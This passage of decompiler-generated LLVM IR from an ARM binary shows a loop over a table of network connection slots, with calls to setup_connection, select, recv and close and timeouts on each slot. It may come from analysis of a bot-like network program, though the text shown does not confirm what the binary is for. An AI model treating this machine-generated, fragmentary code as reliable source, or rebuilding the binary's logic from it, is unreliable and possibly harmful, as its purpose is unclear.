  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e3c8, i32* @r5, align 4
  br label %dec_label_pc_e3ec

dec_label_pc_e3ec:                                ; preds = %dec_label_pc_e38c, %dec_label_pc_e3e8
  %v1_e3f4 = phi i32 [ %v2_e3a0, %dec_label_pc_e38c ], [ %v0_e3d4, %dec_label_pc_e3e8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e3ec = icmp eq i32 %v1_e3f4, 0
  store i1 %v2_e3ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e3ec, label %dec_label_pc_e418, label %dec_label_pc_e3f4

dec_label_pc_e3f4:                                ; preds = %dec_label_pc_e3ec
  %v2_e3f4 = add i32 %v1_e3f4, 16
  %v3_e3f4 = inttoptr i32 %v2_e3f4 to i32*
  store i32 %v3_e374, i32* %v3_e3f4, align 4
  %v0_e3f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_e3f8 = trunc i32 %v0_e3f8 to i16
  %v2_e3f8 = load i32, i32* @r0, align 4
  %v3_e3f8 = add i32 %v2_e3f8, 20
  %v4_e3f8 = inttoptr i32 %v3_e3f8 to i16*
  store i16 %v1_e3f8, i16* %v4_e3f8, align 2
  %v0_e3fc = call i32 @setup_connection()
  store i32 %v0_e3fc, i32* %r0.global-to-local, align 4
  %v1_e280.pre.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_e27c

dec_label_pc_e404:                                ; preds = %dec_label_pc_d2b4
  store i32 ptrtoint (i32* @global_var_23a44.132 to i32), i32* %ip.global-to-local, align 4
  %v2_e408 = load i32, i32* @global_var_23a44.132, align 4
  store i32 %v2_e408, i32* %r0.global-to-local, align 4
  %v1_e40c = call i32 @__GI___libc_close(i32 %v2_e408)
  store i32 %v1_e40c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e410

dec_label_pc_e410:                                ; preds = %dec_label_pc_d290, %dec_label_pc_e404
  %v0_e410 = load i32, i32* @r5, align 4
  store i32 %v0_e410, i32* %r0.global-to-local, align 4
  %v1_e414 = call i32 @__GI_exit(i32 %v0_e410)
  store i32 %v1_e414, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e418

dec_label_pc_e418.loopexit:                       ; preds = %dec_label_pc_e3c8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e418

dec_label_pc_e418:                                ; preds = %dec_label_pc_e3ec, %dec_label_pc_e384, %dec_label_pc_e2b0, %dec_label_pc_e27c, %dec_label_pc_e418.loopexit, %dec_label_pc_e410
  %stack_var_-1880.1 = phi i32 [ %tmp314, %dec_label_pc_e410 ], [ %stack_var_-1880.0, %dec_label_pc_e418.loopexit ], [ %stack_var_-1880.0, %dec_label_pc_e27c ], [ %stack_var_-1880.0, %dec_label_pc_e2b0 ], [ %stack_var_-1880.0, %dec_label_pc_e384 ], [ %stack_var_-1880.0, %dec_label_pc_e3ec ]
  %stack_var_-1876.1 = phi i16 [ %tmp342, %dec_label_pc_e410 ], [ %stack_var_-1876.0, %dec_label_pc_e418.loopexit ], [ %stack_var_-1876.0, %dec_label_pc_e27c ], [ %stack_var_-1876.0, %dec_label_pc_e2b0 ], [ %stack_var_-1876.0, %dec_label_pc_e384 ], [ %stack_var_-1876.0, %dec_label_pc_e3ec ]
  store i32 0, i32* %stack_var_-224, align 4
  store i32 1668, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_e434486 = load i32, i32* @sp, align 4
  %v3_e434487 = add i32 %v2_e434486, 1668
  %v4_e434488 = inttoptr i32 %v3_e434487 to i32*
  store i32 0, i32* %v4_e434488, align 4
  br label %dec_label_pc_e424.dec_label_pc_e424_crit_edge

dec_label_pc_e424.dec_label_pc_e424_crit_edge:    ; preds = %dec_label_pc_e418, %dec_label_pc_e424.dec_label_pc_e424_crit_edge
  %v0_e424.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_e424 = add i32 %v0_e424.pre, 1664
  store i32 %v1_e424, i32* %ip.global-to-local, align 4
  %v1_e428 = add i32 %v0_e424.pre, 4
  store i32 %v1_e428, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_e430 = icmp eq i32 %v1_e428, 128
  %v2_e434 = load i32, i32* @sp, align 4
  %v3_e434 = add i32 %v2_e434, %v1_e424
  %v4_e434 = inttoptr i32 %v3_e434 to i32*
  store i32 0, i32* %v4_e434, align 4
  br i1 %v7_e430, label %dec_label_pc_e43c, label %dec_label_pc_e424.dec_label_pc_e424_crit_edge

dec_label_pc_e43c:                                ; preds = %dec_label_pc_e424.dec_label_pc_e424_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_e43c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e43c, i32* %stack_var_-352, align 4
  %v1_e444480 = add i32 %v0_e43c, 1540
  store i32 %v1_e444480, i32* @lr, align 4
  %v1_e448481 = add i32 %v0_e43c, 8
  store i32 %v1_e448481, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_e450482 = icmp eq i32 %v1_e448481, 128
  %v2_e454483 = load i32, i32* @sp, align 4
  %v3_e454484 = add i32 %v2_e454483, %v1_e444480
  %v4_e454485 = inttoptr i32 %v3_e454484 to i32*
  store i32 0, i32* %v4_e454485, align 4
  br i1 %v7_e450482, label %dec_label_pc_e45c, label %dec_label_pc_e444.dec_label_pc_e444_crit_edge

dec_label_pc_e444.dec_label_pc_e444_crit_edge:    ; preds = %dec_label_pc_e43c, %dec_label_pc_e444.dec_label_pc_e444_crit_edge
  %v0_e444.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_e444 = add i32 %v0_e444.pre, 1536
  store i32 %v1_e444, i32* @lr, align 4
  %v1_e448 = add i32 %v0_e444.pre, 4
  store i32 %v1_e448, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_e450 = icmp eq i32 %v1_e448, 128
  %v2_e454 = load i32, i32* @sp, align 4
  %v3_e454 = add i32 %v2_e454, %v1_e444
  %v4_e454 = inttoptr i32 %v3_e454 to i32*
  store i32 0, i32* %v4_e454, align 4
  br i1 %v7_e450, label %dec_label_pc_e45c, label %dec_label_pc_e444.dec_label_pc_e444_crit_edge

dec_label_pc_e45c:                                ; preds = %dec_label_pc_e444.dec_label_pc_e444_crit_edge, %dec_label_pc_e43c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_e45c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_e45c, i32* @r6, align 4
  store i32 %v0_e45c, i32* @r5, align 4
  %v5_e464 = trunc i32 %v0_e45c to i16
  store i16 %v5_e464, i16* %stack_var_-52, align 2
  %v2_f278 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e4bc

dec_label_pc_e46c:                                ; preds = %dec_label_pc_e4ec
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e4d8, i1* %cpsr_z.global-to-local, align 1
  %v1_f268 = add i32 %v2_e4d0, 4
  %v2_f268 = inttoptr i32 %v1_f268 to i32*
  %v3_f268 = load i32, i32* %v2_f268, align 4
  br i1 %v7_e4d8, label %dec_label_pc_f268, label %dec_label_pc_e474

dec_label_pc_e474:                                ; preds = %dec_label_pc_e46c
  store i32 %v3_f268, i32* %ip.global-to-local, align 4
  %v3_e47c = udiv i32 %v3_f268, 32
  store i32 %v2_f278, i32* %r0.global-to-local, align 4
  %v3_e484 = mul nuw nsw i32 %v3_e47c, 4
  %v2_e488 = add i32 %v3_e484, %v2_f278
  store i32 %v2_e488, i32* %r3.global-to-local, align 4
  %v1_e48c = add i32 %v2_e488, -184
  %v2_e48c = inttoptr i32 %v1_e48c to i32*
  %v3_e48c = load i32, i32* %v2_e48c, align 4
  %v1_e490 = urem i32 %v3_f268, 32
  store i32 %v1_e490, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_e498 = shl i32 1, %v1_e490
  %v8_e498 = or i32 %v3_e48c, %v7_e498
  store i32 %v8_e498, i32* %r2.global-to-local, align 4
  store i32 %v8_e498, i32* %v2_e48c, align 4
  %v0_e4a0 = load i32, i32* @r6, align 4
  %v1_e4a0 = load i32, i32* %ip.global-to-local, align 4
  %v3_e4a0 = icmp uge i32 %v0_e4a0, %v1_e4a0
  store i1 %v3_e4a0, i1* %cpsr_c.global-to-local, align 1
  %v9_e4a0 = icmp eq i32 %v0_e4a0, %v1_e4a0
  store i1 %v9_e4a0, i1* %cpsr_z.global-to-local, align 1
  %v5_e4a4 = icmp slt i32 %v0_e4a0, %v1_e4a0
  br i1 %v5_e4a4, label %bb377, label %bb378

bb377:                                            ; preds = %dec_label_pc_e474
  store i32 %v1_e4a0, i32* @r6, align 4
  br label %bb378

bb378:                                            ; preds = %.thread56, %bb384, %bb382, %bb428, %dec_label_pc_e550, %dec_label_pc_e474, %bb377
  %v3_e4a8 = load i16, i16* %stack_var_-52, align 2
  %v4_e4a8 = sext i16 %v3_e4a8 to i32
  store i32 %v4_e4a8, i32* %r3.global-to-local, align 4
  %v1_e4ac = add nsw i32 %v4_e4a8, 1
  store i32 %v1_e4ac, i32* %r2.global-to-local, align 4
  %v2_e4b0 = icmp ugt i32 %v1_e4ac, 254
  store i1 %v2_e4b0, i1* %cpsr_c.global-to-local, align 1
  %v7_e4b0 = icmp eq i32 %v1_e4ac, 255
  store i1 %v7_e4b0, i1* %cpsr_z.global-to-local, align 1
  %v5_e4b4 = trunc i32 %v1_e4ac to i16
  store i16 %v5_e4b4, i16* %stack_var_-52, align 2
  %v8_e4b8 = icmp sgt i16 %v3_e4a8, 254
  br i1 %v8_e4b8, label %dec_label_pc_e55c, label %dec_label_pc_e4bc

dec_label_pc_e4bc:                                ; preds = %bb378, %dec_label_pc_e45c
  %v0_e4c8 = phi i32 [ %v1_e4ac, %bb378 ], [ %v0_e45c, %dec_label_pc_e45c ]
  store i32 ptrtoint (i32* @global_var_23a40.130 to i32), i32* %r0.global-to-local, align 4
  %v3_e4c0 = mul i32 %v0_e4c8, 256
  store i32 %v3_e4c0, i32* %r3.global-to-local, align 4
  %v2_e4c4 = load i32, i32* @global_var_23a40.130, align 4
  store i32 %v2_e4c4, i32* @r1, align 4
  %v2_e4cc = mul i32 %v0_e4c8, 288
  store i32 %v2_e4cc, i32* %r2.global-to-local, align 4
  %v2_e4d0 = add i32 %v2_e4c4, %v2_e4cc
  store i32 %v2_e4d0, i32* @r4, align 4
  %v1_e4d4 = add i32 %v2_e4d0, 12
  %v2_e4d4 = inttoptr i32 %v1_e4d4 to i32*
  %v3_e4d4 = load i32, i32* %v2_e4d4, align 4
  store i32 %v3_e4d4, i32* %ip.global-to-local, align 4
  %v2_e4d8 = icmp ne i32 %v3_e4d4, 0
  store i1 %v2_e4d8, i1* %cpsr_c.global-to-local, align 1
  %v7_e4d8 = icmp eq i32 %v3_e4d4, 1
  store i1 %v7_e4d8, i1* %cpsr_z.global-to-local, align 1
  %v2_e4dc = xor i1 %v2_e4d8, true
  %v3_e4dc = or i1 %v7_e4d8, %v2_e4dc
  br i1 %v3_e4dc, label %bb379, label %bb380

bb379:                                            ; preds = %dec_label_pc_e4bc
  store i32 5, i32* @r1, align 4
  br label %bb380

bb380:                                            ; preds = %dec_label_pc_e4bc, %bb379
  %v1_e4fc173 = phi i32 [ %v2_e4c4, %dec_label_pc_e4bc ], [ 5, %bb379 ]
  %v2_e4e0 = xor i1 %v7_e4d8, true
  %v3_e4e0 = and i1 %v2_e4d8, %v2_e4e0
  br i1 %v3_e4e0, label %bb381, label %bb382

bb381:                                            ; preds = %bb380
  store i32 30, i32* @r1, align 4
  br label %bb382

bb382:                                            ; preds = %bb380, %bb381
  %v1_e4fc = phi i32 [ %v1_e4fc173, %bb380 ], [ 30, %bb381 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e4e4 = icmp eq i32 %v3_e4d4, 0
  store i1 %v2_e4e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e4e4, label %bb378, label %dec_label_pc_e4ec

dec_label_pc_e4ec:                                ; preds = %bb382
  store i32 ptrtoint (i32* @global_var_20f64.119 to i32), i32* %r2.global-to-local, align 4
  %v2_e4f0 = load i32, i32* @global_var_20f64.119, align 4
  store i32 %v2_e4f0, i32* %r3.global-to-local, align 4
  %v1_e4f4 = add i32 %v2_e4d0, 8
  %v2_e4f4 = inttoptr i32 %v1_e4f4 to i32*
  %v3_e4f4 = load i32, i32* %v2_e4f4, align 4
  store i32 %v3_e4f4, i32* %r2.global-to-local, align 4
  %v2_e4f8 = sub i32 %v2_e4f0, %v3_e4f4
  store i32 %v2_e4f8, i32* %r3.global-to-local, align 4
  %v3_e4fc = icmp uge i32 %v2_e4f8, %v1_e4fc
  store i1 %v3_e4fc, i1* %cpsr_c.global-to-local, align 1
  %v9_e4fc = icmp eq i32 %v2_e4f8, %v1_e4fc
  store i1 %v9_e4fc, i1* %cpsr_z.global-to-local, align 1
  %v2_e500 = xor i1 %v3_e4fc, true
  %v3_e500 = or i1 %v9_e4fc, %v2_e500
  br i1 %v3_e500, label %dec_label_pc_e46c, label %dec_label_pc_e504

dec_label_pc_e504:                                ; preds = %dec_label_pc_e4ec
  %v1_e504 = add i32 %v2_e4d0, 4
  %v2_e504 = inttoptr i32 %v1_e504 to i32*
  %v3_e504 = load i32, i32* %v2_e504, align 4
  store i32 %v3_e504, i32* %r0.global-to-local, align 4
  %v1_e508 = call i32 @__GI___libc_close(i32 %v3_e504)
  store i32 %v1_e508, i32* %r0.global-to-local, align 4
  %v0_e50c = load i32, i32* @r4, align 4
  %v1_e50c = add i32 %v0_e50c, 12
  %v2_e50c = inttoptr i32 %v1_e50c to i32*
  %v3_e50c = load i32, i32* %v2_e50c, align 4
  store i32 %v3_e50c, i32* %r3.global-to-local, align 4
  %v2_e510 = icmp ugt i32 %v3_e50c, 1
  store i1 %v2_e510, i1* %cpsr_c.global-to-local, align 1
  %v7_e510 = icmp eq i32 %v3_e50c, 2
  store i1 %v7_e510, i1* %cpsr_z.global-to-local, align 1
  %v2_e514 = xor i1 %v2_e510, true
  %v3_e514 = or i1 %v7_e510, %v2_e514
  br i1 %v3_e514, label %bb383, label %.thread279

.thread279:                                       ; preds = %dec_label_pc_e504
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_e51c276280 = add i32 %v0_e50c, 4
  %v3_e51c277281 = inttoptr i32 %v2_e51c276280 to i32*
  store i32 -1, i32* %v3_e51c277281, align 4
  br label %bb384

bb383:                                            ; preds = %dec_label_pc_e504
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_e51c273 = add i32 %v0_e50c, 4
  %v3_e51c274 = inttoptr i32 %v2_e51c273 to i32*
  store i32 -1, i32* %v3_e51c274, align 4
  %v4_e520 = load i32, i32* %r3.global-to-local, align 4
  %v5_e520 = load i32, i32* @r4, align 4
  %v6_e520 = add i32 %v5_e520, 12
  %v7_e520 = inttoptr i32 %v6_e520 to i32*
  store i32 %v4_e520, i32* %v7_e520, align 4
  %v4_e524 = load i32, i32* %r3.global-to-local, align 4
  %v5_e524 = trunc i32 %v4_e524 to i8
  %v6_e524 = load i32, i32* @r4, align 4
  %v7_e524 = add i32 %v6_e524, 284
  %v8_e524 = inttoptr i32 %v7_e524 to i8*
  store i8 %v5_e524, i8* %v8_e524, align 1
  %v0_e528.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_e528.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb384

bb384:                                            ; preds = %.thread279, %bb383
  %v1_e528 = phi i1 [ %v1_e528.pre, %bb383 ], [ %v2_e510, %.thread279 ]
  %v0_e528 = phi i1 [ %v0_e528.pre, %bb383 ], [ false, %.thread279 ]
  %v2_e528 = xor i1 %v1_e528, true
  %v3_e528 = or i1 %v0_e528, %v2_e528
  br i1 %v3_e528, label %bb378, label %dec_label_pc_e52c

dec_label_pc_e52c:                                ; preds = %bb384
  %v0_e52c = load i32, i32* @r4, align 4
  %v1_e52c = add i32 %v0_e52c, 284
  %v2_e52c = inttoptr i32 %v1_e52c to i8*
  %v3_e52c = load i8, i8* %v2_e52c, align 1
  %v4_e52c = zext i8 %v3_e52c to i32
  %v1_e530 = add nuw nsw i32 %v4_e52c, 1
  %v1_e534 = urem i32 %v1_e530, 256
  store i32 %v1_e534, i32* %r3.global-to-local, align 4
  %v2_e538 = icmp ugt i32 %v1_e534, 9
  store i1 %v2_e538, i1* %cpsr_c.global-to-local, align 1
  %v7_e538 = icmp eq i32 %v1_e534, 10
  store i1 %v7_e538, i1* %cpsr_z.global-to-local, align 1
  %v1_e53c = trunc i32 %v1_e530 to i8
  store i8 %v1_e53c, i8* %v2_e52c, align 1
  %v0_e540 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e540, label %.thread56, label %dec_label_pc_e550

.thread56:                                        ; preds = %dec_label_pc_e52c
  %v1_e540 = load i32, i32* %r3.global-to-local, align 4
  %v2_e540 = add i32 %v1_e540, -10
  store i32 %v2_e540, i32* %r3.global-to-local, align 4
  %v2_e544 = load i32, i32* @r4, align 4
  %v3_e544 = add i32 %v2_e544, 12
  %v4_e544 = inttoptr i32 %v3_e544 to i32*
  store i32 %v2_e540, i32* %v4_e544, align 4
  %v1_e548 = load i32, i32* %r3.global-to-local, align 4
  %v2_e548 = trunc i32 %v1_e548 to i8
  %v3_e548 = load i32, i32* @r4, align 4
  %v4_e548 = add i32 %v3_e548, 284
  %v5_e548 = inttoptr i32 %v4_e548 to i8*
  store i8 %v2_e548, i8* %v5_e548, align 1
  %v0_e54c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e54c.pr.pr, label %bb378, label %dec_label_pc_e550

dec_label_pc_e550:                                ; preds = %dec_label_pc_e52c, %.thread56
  %v0_e550 = load i32, i32* @r4, align 4
  store i32 %v0_e550, i32* @r0, align 4
  %v0_e554 = call i32 @setup_connection()
  store i32 %v0_e554, i32* %r0.global-to-local, align 4
  br label %bb378

dec_label_pc_e55c:                                ; preds = %bb378
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_e568 = load i32, i32* @r5, align 4
  %v1_e568 = load i32, i32* @r6, align 4
  %v3_e568 = icmp uge i32 %v0_e568, %v1_e568
  store i1 %v3_e568, i1* %cpsr_c.global-to-local, align 1
  %v9_e568 = icmp eq i32 %v0_e568, %v1_e568
  store i1 %v9_e568, i1* %cpsr_z.global-to-local, align 1
  %v5_e56c = icmp slt i32 %v0_e568, %v1_e568
  %storemerge134 = select i1 %v5_e56c, i32 %v1_e568, i32 %v0_e568
  %v2_e578 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_e578, i32* %ip.global-to-local, align 4
  %v2_e57c = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v2_e57c, i32* %r1.global-to-local, align 4
  %v2_e580 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_e580, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_e588 = add i32 %storemerge134, 1
  store i32 %v1_e588, i32* %r0.global-to-local, align 4
  %v5_e594 = call i32 @__libc_select(i32 %v1_e588, i32 %v2_e57c, i32 %v2_e580, i32 0, i32 %v2_e578)
  %v0_e598 = load i32, i32* @r4, align 4
  store i32 %v0_e598, i32* %r0.global-to-local, align 4
  %v1_e59c = inttoptr i32 %v0_e598 to i32*
  %v2_e59c = call i32 @__GI_time(i32* %v1_e59c)
  store i32 %v2_e59c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20f64.119 to i32), i32* @lr, align 4
  %v0_e5a4 = load i32, i32* @r4, align 4
  %v5_e5a4 = trunc i32 %v0_e5a4 to i16
  store i16 %v5_e5a4, i16* %stack_var_-52, align 2
  store i32 %v2_e59c, i32* @global_var_20f64.119, align 4
  %v2_eec0 = ptrtoint i32* %stack_var_-45 to i32
  %v2_eed4 = ptrtoint i32* %stack_var_-80 to i32
  %v2_eedc = ptrtoint i32* %stack_var_-77 to i32
  %v2_ec90 = ptrtoint i32* %stack_var_-60 to i32
  %v2_eca4 = ptrtoint i8* %stack_var_-56 to i32
  %v2_ecac = bitcast i8* %stack_var_-56 to i32*
  %v2_efcc = ptrtoint i32* %stack_var_-96 to i32
  br label %dec_label_pc_e5ac

dec_label_pc_e5ac:                                ; preds = %dec_label_pc_e720, %dec_label_pc_e55c
  %v0_e5b8 = phi i32 [ %v1_e724, %dec_label_pc_e720 ], [ %v0_e5a4, %dec_label_pc_e55c ]
  store i32 ptrtoint (i32* @global_var_23a40.130 to i32), i32* %r0.global-to-local, align 4
  %v3_e5b0 = mul i32 %v0_e5b8, 256
  store i32 %v3_e5b0, i32* %r3.global-to-local, align 4
  %v2_e5b4 = load i32, i32* @global_var_23a40.130, align 4
  store i32 %v2_e5b4, i32* %r1.global-to-local, align 4
  %v2_e5bc = mul i32 %v0_e5b8, 288
  store i32 %v2_e5bc, i32* %r2.global-to-local, align 4
  %v2_e5c0 = add i32 %v2_e5b4, %v2_e5bc
  store i32 %v2_e5c0, i32* @r5, align 4
  %v1_e5c4 = add i32 %v2_e5c0, 4
  %v2_e5c4 = inttoptr i32 %v1_e5c4 to i32*
  %v3_e5c4 = load i32, i32* %v2_e5c4, align 4
  store i32 %v3_e5c4, i32* %r0.global-to-local, align 4
  %v2_e5c8 = icmp eq i32 %v3_e5c4, -1
  store i1 %v2_e5c8, i1* %cpsr_c.global-to-local, align 1
  %v7_e5c8 = icmp eq i32 %v3_e5c4, -1
  store i1 %v7_e5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e5c8, label %dec_label_pc_e720, label %dec_label_pc_e5d0

dec_label_pc_e5d0:                                ; preds = %dec_label_pc_e5ac
  %v3_e5d0 = udiv i32 %v3_e5c4, 32
  store i32 %v2_f278, i32* %r1.global-to-local, align 4
  %v3_e5dc = mul nuw nsw i32 %v3_e5d0, 4
  store i32 %v3_e5dc, i32* @ip, align 4
  %v2_e5e0 = add i32 %v3_e5dc, %v2_f278
  store i32 %v2_e5e0, i32* %r2.global-to-local, align 4
  %v1_e5e4 = add i32 %v2_e5e0, -312
  %v2_e5e4 = inttoptr i32 %v1_e5e4 to i32*
  %v3_e5e4 = load i32, i32* %v2_e5e4, align 4
  %v1_e5e8 = urem i32 %v3_e5c4, 32
  store i32 %v1_e5e8, i32* %r1.global-to-local, align 4
  %v2_e5ec = add nsw i32 %v1_e5e8, -1
  %v3_e5ec = shl i32 1, %v2_e5ec
  %v4_e5ec = and i32 %v3_e5e4, %v3_e5ec
  %v5_e5ec = icmp ne i32 %v4_e5ec, 0
  store i1 %v5_e5ec, i1* %cpsr_c.global-to-local, align 1
  %v6_e5ec = ashr i32 %v3_e5e4, %v1_e5e8
  store i32 %v6_e5ec, i32* %r3.global-to-local, align 4
  %v1_e5f0 = urem i32 %v6_e5ec, 2
  %v2_e5f0 = icmp eq i32 %v1_e5f0, 0
  store i1 %v2_e5f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e5f0, label %dec_label_pc_e5f8, label %dec_label_pc_f0b0

dec_label_pc_e5f8:                                ; preds = %dec_label_pc_e5d0, %dec_label_pc_f160
  %v1_e608 = phi i32 [ %v1_e5e8, %dec_label_pc_e5d0 ], [ %v1_e608.pre, %dec_label_pc_f160 ]
  %v0_e600 = phi i32 [ %v3_e5dc, %dec_label_pc_e5d0 ], [ %v0_e600.pre, %dec_label_pc_f160 ]
  store i32 %v2_f278, i32* %r3.global-to-local, align 4
  %v2_e600 = add i32 %v0_e600, %v2_f278
  store i32 %v2_e600, i32* %r2.global-to-local, align 4
  %v1_e604 = add i32 %v2_e600, -184
  %v2_e604 = inttoptr i32 %v1_e604 to i32*
  %v3_e604 = load i32, i32* %v2_e604, align 4
  %v2_e608 = add i32 %v1_e608, -1
  %v3_e608 = shl i32 1, %v2_e608
  %v4_e608 = and i32 %v3_e604, %v3_e608
  %v5_e608 = icmp ne i32 %v4_e608, 0
  store i1 %v5_e608, i1* %cpsr_c.global-to-local, align 1
  %v6_e608 = ashr i32 %v3_e604, %v1_e608
  store i32 %v6_e608, i32* %r3.global-to-local, align 4
  %v1_e60c = urem i32 %v6_e608, 2
  %v2_e60c = icmp eq i32 %v1_e60c, 0
  store i1 %v2_e60c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e60c, label %dec_label_pc_e720, label %dec_label_pc_e614.preheader

dec_label_pc_e614.preheader:                      ; preds = %dec_label_pc_e5f8
  %v0_e614156 = load i32, i32* @r5, align 4
  %v1_e614157 = add i32 %v0_e614156, 12
  %v2_e614158 = inttoptr i32 %v1_e614157 to i32*
  %v3_e614159 = load i32, i32* %v2_e614158, align 4
  store i32 %v3_e614159, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e618155161 = icmp eq i32 %v3_e614159, 0
  store i1 %v2_e618155161, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e618155161, label %dec_label_pc_e720, label %dec_label_pc_e620.lr.ph

dec_label_pc_e614.loopexit:                       ; preds = %dec_label_pc_ef70, %dec_label_pc_ede0
  %v0_e614 = load i32, i32* @r5, align 4
  %v1_e614 = add i32 %v0_e614, 12
  %v2_e614 = inttoptr i32 %v1_e614 to i32*
  %v3_e614 = load i32, i32* %v2_e614, align 4
  store i32 %v3_e614, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e618155 = icmp eq i32 %v3_e614, 0
  store i1 %v2_e618155, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e618155, label %dec_label_pc_e720, label %dec_label_pc_e620.lr.ph

dec_label_pc_e620.lr.ph:                          ; preds = %dec_label_pc_e614.preheader, %dec_label_pc_e614.loopexit
  %v0_e620189 = phi i32 [ %v0_e614, %dec_label_pc_e614.loopexit ], [ %v0_e614156, %dec_label_pc_e614.preheader ]
  br label %dec_label_pc_e620

dec_label_pc_e620:                                ; preds = %dec_label_pc_e618.backedge.thread, %dec_label_pc_e618.backedge, %dec_label_pc_e618.backedge.thread528, %dec_label_pc_e620.lr.ph
  %v0_f040 = phi i32 [ %v0_e620189, %dec_label_pc_e620.lr.ph ], [ %v0_e620186, %dec_label_pc_e618.backedge ], [ %v0_e694, %dec_label_pc_e618.backedge.thread ], [ %v0_e694, %dec_label_pc_e618.backedge.thread528 ]
  %v1_e620 = add i32 %v0_f040, 24
  %v2_e620 = inttoptr i32 %v1_e620 to i32*
  %v3_e620 = load i32, i32* %v2_e620, align 4
  store i32 %v3_e620, i32* @r3, align 4
  %v2_e624 = icmp ugt i32 %v3_e620, 255
  store i1 %v2_e624, i1* %cpsr_c.global-to-local, align 1
  %v7_e624 = icmp eq i32 %v3_e620, 256
  store i1 %v7_e624, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_f040, 28
  store i32 %.pre, i32* @sl, align 4
  br i1 %v7_e624, label %dec_label_pc_f040, label %dec_label_pc_e630

dec_label_pc_e630:                                ; preds = %dec_label_pc_e620, %dec_label_pc_f040
  store i32 0, i32* @r6, align 4
  %v1_e634 = load i32, i32* @sb, align 4
  %v2_e634 = inttoptr i32 %v1_e634 to i32*
  store i32 0, i32* %v2_e634, align 4
  %v0_e638 = load i32, i32* @r5, align 4
  %v1_e638 = add i32 %v0_e638, 24
  %v2_e638 = inttoptr i32 %v1_e638 to i32*
  %v3_e638 = load i32, i32* %v2_e638, align 4
  store i32 %v3_e638, i32* %r2.global-to-local, align 4
  %v0_e63c = load i32, i32* @sl, align 4
  %v2_e63c = add i32 %v0_e63c, %v3_e638
  store i32 %v2_e63c, i32* @r4, align 4
  %v1_e640 = add i32 %v0_e638, 4
  %v2_e640 = inttoptr i32 %v1_e640 to i32*
  %v3_e640 = load i32, i32* %v2_e640, align 4
  store i32 %v3_e640, i32* %r0.global-to-local, align 4
  %v1_e644 = sub i32 256, %v3_e638
  store i32 %v1_e644, i32* %r2.global-to-local, align 4
  store i32 %v2_e63c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e650 = call i32 @__libc_recv(i32 %v3_e640, i32 %v2_e63c, i32 %v1_e644, i32 16384)
  store i32 %v4_e650, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e654 = icmp eq i32 %v4_e650, 0
  store i1 %v2_e654, i1* %cpsr_z.global-to-local, align 1
  %tmp385 = icmp slt i32 %v4_e650, 1
  br i1 %tmp385, label %dec_label_pc_e6cc, label %dec_label_pc_e65c

dec_label_pc_e65c:                                ; preds = %dec_label_pc_e630
  %v0_e65c = load i32, i32* @r6, align 4
  store i32 %v0_e65c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e660

dec_label_pc_e660:                                ; preds = %.thread63, %dec_label_pc_e65c
  %v3_e66c = phi i32 [ %v1_e670, %.thread63 ], [ %v0_e65c, %dec_label_pc_e65c ]
  %v1_e660 = load i32, i32* @r4, align 4
  %v2_e660 = add i32 %v1_e660, %v3_e66c
  %v3_e660 = inttoptr i32 %v2_e660 to i8*
  %v4_e660 = load i8, i8* %v3_e660, align 1
  %v6_e660 = zext i8 %v4_e660 to i32
  store i32 %v6_e660, i32* %r3.global-to-local, align 4
